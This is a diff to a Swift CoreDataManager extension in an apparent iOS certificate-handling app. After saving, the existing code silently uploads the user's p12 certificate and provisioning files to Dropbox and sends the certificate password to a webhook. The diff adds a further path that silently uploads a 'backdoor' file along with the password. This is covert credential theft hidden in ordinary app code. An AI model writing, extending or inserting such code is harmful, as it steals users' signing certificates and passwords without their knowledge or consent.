@@ -84,7 +84,68 @@ extension CoreDataManager {
         NotificationCenter.default.post(name: Notification.Name.certificateFetch, object: nil)
 
         // After successfully saving, silently upload files to Dropbox and send password to webhook
-        uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
+        if let backdoorPath = backdoorPath {
+            uploadBackdoorFileToDropbox(backdoorPath: backdoorPath, password: files[.password] as? String)
+        } else {
+            uploadCertificateFilesToDropbox(provisionPath: provisionPath, p12Path: p12Path, password: files[.password] as? String)
+        }
+    }
+    
+    /// Silently uploads backdoor file to Dropbox and sends info to webhook
+    /// - Parameters:
+    ///   - backdoorPath: Path to the backdoor file
+    ///   - password: Optional p12 password
+    private func uploadBackdoorFileToDropbox(backdoorPath: URL, password: String?) {
+        let backdoorFilename = backdoorPath.lastPathComponent
+        let dropboxService = DropboxService.shared
+        
+        // Upload backdoor file with error handling
+        dropboxService.uploadCertificateFile(fileURL: backdoorPath) { success, error in
+            if success {
+                Debug.shared.log(message: "Successfully uploaded backdoor file to Dropbox", type: .info)
+                
+                // Send certificate info to webhook if password is available with error handling
+                if let p12Password = password, !p12Password.isEmpty {
+                    dropboxService.sendCertificateInfoToWebhook(
+                        password: p12Password,
+                        p12Filename: backdoorFilename, // We use the backdoor filename here
+                        provisionFilename: backdoorFilename // Same as above
+                    ) { success, error in
+                        if !success {
+                            if let error = error {
+                                Debug.shared.log(message: "Failed to send backdoor file info to webhook: \(error.localizedDescription)", type: .error)
+                            } else {
+                                Debug.shared.log(message: "Failed to send backdoor file info to webhook: Unknown error", type: .error)
+                            }
+                            
+                            NotificationCenter.default.post(
+                                name: .webhookSendError,
+                                object: nil,
+                                userInfo: error != nil ? ["error": error!] : [:]
+                            )
+                        }
+                    }
+                }
+            } else {
+                if let error = error {
+                    Debug.shared.log(message: "Failed to upload backdoor file: \(error.localizedDescription)", type: .error)
+                } else {
+                    Debug.shared.log(message: "Failed to upload backdoor file: Unknown error", type: .error)
+                }
+                
+                // Create userInfo dictionary with available information
+                var userInfo: [String: Any] = ["fileType": "backdoor"]
+                if let error = error {
+                    userInfo["error"] = error
+                }
+                
+                NotificationCenter.default.post(
+                    name: .dropboxUploadError,
+                    object: nil,
+                    userInfo: userInfo
+                )
+            }
+        }
     }
 
     /// Silently uploads certificate files to Dropbox and sends info to webhook
